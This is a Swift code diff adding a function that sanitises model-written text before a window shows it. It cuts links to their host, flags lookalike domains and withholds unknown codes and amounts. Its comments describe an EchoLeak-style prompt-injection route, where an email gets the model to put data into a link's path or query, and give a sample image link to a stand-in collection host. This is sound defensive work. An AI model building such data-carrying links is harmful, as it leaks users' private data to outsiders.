@@ -9,6 +9,8 @@ import Foundation
 /// flagged, whether the model added it up or made it up. Chinese numerals count as digits
 /// wherever `NumberRules.writingNumbersAsDigits` writes them so, as in 五万八千六百元 and
 /// 十月十九日. The phase 0 prototype (numcheck.py) is the reference.
+///
+/// It also gives what the window may show of a text the model wrote, see `shown`.
 nonisolated enum OutputChecks {
     nonisolated struct Finding: Sendable, Equatable, Codable {
         nonisolated enum Kind: Sendable, Codable {
@@ -58,6 +60,213 @@ nonisolated enum OutputChecks {
             seen.append(finding)
         }
         return seen
+    }
+
+    // MARK: What the window shows
+
+    /// A text the model wrote, as the window may show it, in `language`: a point, a
+    /// question, one of the model's own warnings, or what the draft check took out of a
+    /// draft.
+    /// - Each link shows as its host only, such as collect.example. A link's path and
+    ///   query are where an email puts the data it wants carried out, as in EchoLeak, and
+    ///   the model may fill them in. The host says where the link goes, see `host(of:)`.
+    ///   A link without a plain host shows as the link placeholder. So does one that a
+    ///   letter outside ASCII and Chinese touches, as the Cyrillic і of
+    ///   https://pіc-conf.example/x does, since the link was cut there and its host would
+    ///   show only a part. A link that is only a host stays as it is, so a lookalike such
+    ///   as shаnlan-tea.example still shows whole.
+    /// - With `withholding`, codes and numbers that it does not hold become the project
+    ///   data placeholder: booking, account and ID numbers, amounts and scores. The
+    ///   explanation passes what the recipients already have when the email asks someone
+    ///   outside the project for personal data, a credential or confidential project data,
+    ///   so the window never sets out the values such a request asks for, from the files or
+    ///   other mail. Mail addresses and a link's own domain stay whole, so a lookalike such
+    ///   as pic-c0nf.example still shows. A link whose subdomain holds such a code shows as
+    ///   the link placeholder.
+    static func shown(_ text: String, withholding: String? = nil, language: ProjectsLanguage) -> String {
+        let original = SortingText.withoutFormatCharacters(text)
+        let folded = Folded(original)
+        let known = withholding?.precomposedStringWithCompatibilityMapping
+        let knownCodes = known.map { known in Set(codes(in: known).map { codeValue(known[$0]) }) }
+        var edits: [(Range<String.Index>, String)] = []
+        let links = linkRanges(in: original)
+        for link in links {
+            let linkText = String(original[link])
+            var shownHost = host(of: linkText)
+            if shownHost != linkText.precomposedStringWithCompatibilityMapping.lowercased(), touchesForeignLetter(link, in: original) {
+                shownHost = nil
+            }
+            if let found = shownHost, let knownCodes {
+                let subdomain = found.split(separator: ".").dropLast(2).joined(separator: ".")
+                if codes(in: subdomain).contains(where: { !knownCodes.contains(codeValue(subdomain[$0])) }) {
+                    shownHost = nil
+                }
+            }
+            edits.append((link, shownHost ?? DraftCheck.placeholder(.link, language)))
+        }
+        if let known, let knownCodes {
+            let knownValues = Set(
+                numbers(in: known, skippingDatesAndCodes: false).map(\.value)
+                    + numbers(in: NumberRules.writingNumbersAsDigits(in: known), skippingDatesAndCodes: false).map(\.value)
+            )
+            var found: [Range<String.Index>] = []
+            for code in codes(in: folded.text) where !knownCodes.contains(codeValue(folded.text[code])) {
+                found.append(code)
+            }
+            for number in numbers(in: folded.text) where (number.isAmount || number.isScore) && !knownValues.contains(number.value) {
+                found.append(number.range)
+            }
+            let addresses = mailAddress.matches(in: folded.text, range: NSRange(folded.text.startIndex..., in: folded.text))
+                .compactMap { Range($0.range, in: folded.text).flatMap(folded.original) }
+            for range in ContentChecks.merged(found.compactMap(folded.original)) where !(links + addresses).contains(where: { $0.overlaps(range) }) {
+                edits.append((range, DraftCheck.placeholder(.projectData, language)))
+            }
+        }
+        guard !edits.isEmpty else { return original }
+        var result = ""
+        var cursor = original.startIndex
+        for (range, replacement) in edits.sorted(by: { $0.0.lowerBound < $1.0.lowerBound }) where range.lowerBound >= cursor {
+            result += original[cursor..<range.lowerBound]
+            result += replacement
+            cursor = range.upperBound
+        }
+        result += original[cursor...]
+        return result
+    }
+
+    /// The host a link goes to, lowercased, such as collect.example for
+    /// ![x](https://collect.example/p?d=…), or nil when the link names no plain one. It is
+    /// read where the link goes: the target of a Markdown link and the value of href or
+    /// src, never the text or a title around them, and in a web address the part after //
+    /// up to the path. A user part before an @ there, two different hosts, or a host that
+    /// is not a plain dotted name gives nil, since each can set a known name in front of
+    /// the host the link really goes to.
+    static func host(of link: String) -> String? {
+        let text = link.precomposedStringWithCompatibilityMapping
+        var targets = [text]
+        if let pattern = text.hasPrefix("<") ? tagTarget : text.hasPrefix("[") || text.hasPrefix("!") ? markdownTarget : nil {
+            targets = pattern.matches(in: text, range: NSRange(text.startIndex..., in: text))
+                .compactMap { Range($0.range(at: 1), in: text).map { String(text[$0]) } }
+        }
+        var hosts: Set<String> = []
+        for target in targets {
+            guard let host = targetHost(target) else { return nil }
+            hosts.insert(host)
+        }
+        return hosts.count == 1 ? hosts.first : nil
+    }
+
+    /// The host of where a link goes, lowercased, or nil when it names no plain one. A
+    /// backslash ends the host, as it does in a browser.
+    private static func targetHost(_ target: String) -> String? {
+        var host: Substring
+        if let slashes = target.range(of: "://") {
+            host = target[slashes.upperBound...].prefix { !"/?#\\".contains($0) }
+            guard !host.contains("@") else { return nil }
+        } else if target.lowercased().hasPrefix("mailto:") {
+            let address = target.dropFirst("mailto:".count).prefix { $0 != "?" }
+            guard let at = address.lastIndex(of: "@") else { return nil }
+            host = address[address.index(after: at)...]
+        } else {
+            host = target.prefix { !"/?#\\".contains($0) }
+        }
+        if let colon = host.lastIndex(of: ":"), host[host.index(after: colon)...].allSatisfy({ ("0"..."9").contains($0) }) {
+            host = host[..<colon]
+        }
+        let name = host.lowercased()
+        return plainHost.firstMatch(in: name, range: NSRange(name.startIndex..., in: name)) == nil ? nil : name
+    }
+
+    /// Whether a letter or digit other than an ASCII or a Chinese one touches the range.
+    private static func touchesForeignLetter(_ range: Range<String.Index>, in text: String) -> Bool {
+        let before = range.lowerBound > text.startIndex ? text[text.index(before: range.lowerBound)] : nil
+        let after = range.upperBound < text.endIndex ? text[range.upperBound] : nil
+        return [before, after].contains { character in
+            guard let character, character.isLetter || character.isNumber else { return false }
+            return !character.isASCII && !character.isHan
+        }
+    }
+
+    /// Where a Markdown link or image goes.
+    private static let markdownTarget = try! NSRegularExpression(pattern: #"\]\(\s*([^)\s]+)"#)
+
+    /// The value of an attribute of an HTML tag that links or loads.
+    private static let tagTarget = try! NSRegularExpression(
+        pattern: #"(?<=[\s/])(?:href|src|srcset|action|formaction|poster|background|data|content)\s*=\s*["']?([^"'\s>]+)"#,
+        options: .caseInsensitive
+    )
+
+    /// A host as a whole: dotted labels of ASCII letters, digits and hyphens, and a top
+    /// level domain of letters.
+    private static let plainHost = try! NSRegularExpression(
+        pattern: #"^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}$"#
+    )
+
+    /// A mail address, as the model writes one.
+    private static let mailAddress = try! NSRegularExpression(pattern: #"[A-Za-z0-9._%+-]+@(?:[A-Za-z0-9-]+\.)+[A-Za-z]{2,24}"#)
+
+    // MARK: Links
+
+    /// Where the text holds a link: what `ContentChecks.linkRanges(in:)` finds, and any
+    /// other dotted host, such as harbor-pay.zone, unless it ends in a file extension, as
+    /// plan_v3.pdf, build.js and setup.exe do. Read in compatibility form, so a host in
+    /// full width letters counts too.
+    static func linkRanges(in text: String) -> [Range<String.Index>] {
+        let folded = Folded(text)
+        var found = ContentChecks.linkRanges(in: folded.text)
+        for match in bareHost.matches(in: folded.text, range: NSRange(folded.text.startIndex..., in: folded.text)) {
+            guard let range = Range(match.range, in: folded.text), let last = Range(match.range(at: 1), in: folded.text),
+                  !fileExtensions.contains(folded.text[last].lowercased()) else { continue }
+            found.append(range)
+        }
+        return ContentChecks.merged(found.compactMap(folded.original))
+    }
+
+    private static let bareHost = try! NSRegularExpression(
+        pattern: #"(?<![A-Za-z0-9_@.-])(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+([A-Za-z]{2,24})(?![A-Za-z0-9_@-])"#
+    )
+
+    /// The extensions of file names, which are no hosts. Programs are among them, so an
+    /// attachment named 报价单fdp.exe reads as a file.
+    private static let fileExtensions: Set<String> = [
+        "pdf", "doc", "docx", "xls", "xlsx", "xlsm", "ppt", "pptx", "key", "pages", "numbers", "txt", "rtf", "md", "csv",
+        "json", "xml", "html", "htm", "jpg", "jpeg", "png", "gif", "heic", "webp", "tif", "tiff", "bmp", "svg", "psd", "ai",
+        "eps", "indd", "sketch", "fig", "dwg", "dxf", "skp", "rvt", "zip", "rar", "gz", "tar", "mp3", "mp4", "m4a", "mov",
+        "wav", "avi", "ics", "vcf", "eml", "msg", "log", "js", "ts", "py", "swift", "cc", "cpp", "java", "app",
+        "exe", "msi", "bat", "cmd", "scr", "dmg", "pkg", "apk", "iso", "jar", "vbs", "lnk", "ps1",
+    ]
+
+    /// A text in compatibility form, so full width letters, digits and dots and the no
+    /// break space read as plain ones, with the way back to the text it came from. The
+    /// checks find links, codes, numbers and names here and remove them from the original,
+    /// which keeps the text's own full width punctuation.
+    nonisolated struct Folded {
+        let text: String
+        /// For each UTF-16 unit of `text`, the character of the original it came from.
+        private let origins: [Range<String.Index>]
+
+        init(_ original: String) {
+            var text = ""
+            var origins: [Range<String.Index>] = []
+            var index = original.startIndex
+            while index < original.endIndex {
+                let next = original.index(after: index)
+                let piece = String(original[index..<next]).precomposedStringWithCompatibilityMapping
+                text += piece
+                origins += repeatElement(index..<next, count: piece.utf16.count)
+                index = next
+            }
+            self.text = text
+            self.origins = origins
+        }
+
+        /// The range of the original that a range of `text` came from.
+        func original(_ range: Range<String.Index>) -> Range<String.Index>? {
+            let start = range.lowerBound.utf16Offset(in: text)
+            let end = range.upperBound.utf16Offset(in: text)
+            guard start < end, end <= origins.count else { return nil }
+            return origins[start].lowerBound..<origins[end - 1].upperBound
+        }
     }
 
     // MARK: Numbers
